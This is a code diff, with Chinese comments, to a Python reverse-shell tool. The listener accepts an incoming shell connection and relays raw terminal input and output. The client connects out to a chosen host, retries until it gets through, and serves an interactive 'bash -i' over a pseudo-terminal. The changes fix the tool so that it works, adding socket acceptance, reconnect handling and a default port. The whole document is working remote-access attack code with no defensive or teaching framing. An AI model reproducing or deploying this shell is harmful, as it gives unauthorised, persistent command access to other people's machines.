@@ -11,6 +11,7 @@ import os
 import sys
 import pty
 import tty
+import time
 import fcntl
 import socket
 import struct
@@ -20,6 +21,8 @@ import argparse
 import threading
 import selectors
 from subprocess import Popen
+
+
 SHELL='bash -i'
 STDIN = sys.stdin.fileno()
 # STDIN = sys.stdin
@@ -38,10 +41,9 @@ def set_pty_size(fd, columns, rows):
 # 窗口大小调整
 def signal_SIGWINCH_handle(sigNum, frame):
     size = get_pty_size(STDOUT)
-    print(f"窗口大小改变: {size}")
+    # print(f"窗口大小改变: {size}")
     set_pty_size(STDOUT, *size)
-    print("sigwinch 执行完成")
-
+    # print("sigwinch 执行完成")
 
 
 def socketshell(sock):
@@ -85,65 +87,48 @@ def socketshell(sock):
         ss.close()
         print("sock exit")
 
-STDIN = sys.stdin.fileno()
-# STDIN = sys.stdin
-STDOUT = sys.stdout.fileno()
-
-def get_pty_size(fd):
-    size = fcntl.ioctl(sys.stdin.fileno(), termios.TIOCGWINSZ, b"0000") # 占位符
-    return struct.unpack("HH", size)
-
-def set_pty_size(fd, columns, rows):
-    size = struct.pack("HH", columns, rows)
-    # 这个返回还知道是什么
-    return fcntl.ioctl(sys.stdin.fileno(), termios.TIOCSWINSZ, size)
-
-
-# 窗口大小调整
-def signal_SIGWINCH_handle(sigNum, frame):
-    size = get_pty_size(STDOUT)
-    print(f"窗口大小改变: {size}")
-    
-    # termios.tcgetattr(sys.stdin)
-    # termios.tcsetattr(sys.stdin, termios.TCSADRAIN, tty_bak)
-
-    set_pty_size(STDOUT, *size)
-
-    print("sigwinch 执行完成")
-
 
 def server(addr, port):
     server_addr = (addr, port)
     print(sys.argv[0], "listen: ", server_addr)
 
     signal.signal(signal.SIGWINCH, signal_SIGWINCH_handle)
+
     sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
     sock.bind(server_addr)
     sock.listen(5)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, True)
+
+    client, addr = sock.accept()
+    print(f"有反向shell连接上: {addr}")
+    
+    # 关闭监听
+    sock.close()
 
     # tty 
     tty_bak = termios.tcgetattr(sys.stdin)
     tty.setraw(STDIN)
 
     ss = selectors.DefaultSelector()
-    ss.register(sock, selectors.EVENT_READ)
+    ss.register(client, selectors.EVENT_READ)
     ss.register(STDIN, selectors.EVENT_READ)
 
     exit_flag = True
     while exit_flag:
         for key, event in ss.select():
             fd = key.fileobj
-            if fd == sock:
-                data = sock.recv(1024)
+            if fd == client:
+                data = client.recv(1024)
                 if not data:
                     exit_flag = False
                     break
                 os.write(STDOUT, data)
             elif fd == STDIN:
                 data = os.read(STDIN, 1024)
-                sock.send(data)
+                client.send(data)
 
+    client.close()
     ss.close()
 
     termios.tcsetattr(sys.stdin, termios.TCSADRAIN, tty_bak)
@@ -153,17 +138,22 @@ def server(addr, port):
 def client(addr, port=6789):
     server_addr = (addr, port)
 
-    sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
-    sock.settimeout(10)
+    # sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
+    # sock.settimeout(10)
 
     while True:
         try:
-            sock.connect(addr)
+            sock = socket.create_connection(server_addr, timeout=10)
         except TimeoutError:
             print(f"连接超时。。。重新连接")
             continue
+        except ConnectionRefusedError:
+            print(f"服务端口关闭，等待重新打开。。。")
+            time.sleep(10)
+            continue
 
-        print("client connect:", addr)
+
+        print(f"client connect: {server_addr}")
         th = threading.Thread(target=socketshell, args=(sock,), daemon=True)
         th.start()
         th.join()
@@ -179,16 +169,25 @@ def main():
 
     parse.add_argument("--server", action="store_true", help="启动server端")
     parse.add_argument("--client", action="store_true", help="使用client端")
-    parse.add_argument("--addr", help="需要连接的IP或域名")
-    parse.add_argument("--port", help="端口")
+    parse.add_argument("--addr", default="", help="需要连接的IP或域名")
+    parse.add_argument("--port", default=6789, type=int, help="端口")
+
+    parse.add_argument("--parse", action="store_true", help=argparse.SUPPRESS)
 
     args = parse.parse_args()
 
+    if args.parse:
+        print(args)
+        sys.exit(0)
+
     if args.server:
-        server(args.server, args.port)
+        server(args.addr, args.port)
     
     elif args.client:
-        client(args.server, args.port)
+        if args.client == "":
+            print("客户端需要 IP OR domainname")
+            sys.exit(1)
+        client(args.addr, args.port)
     else:
         parse.print_help()
         sys.exit(1)
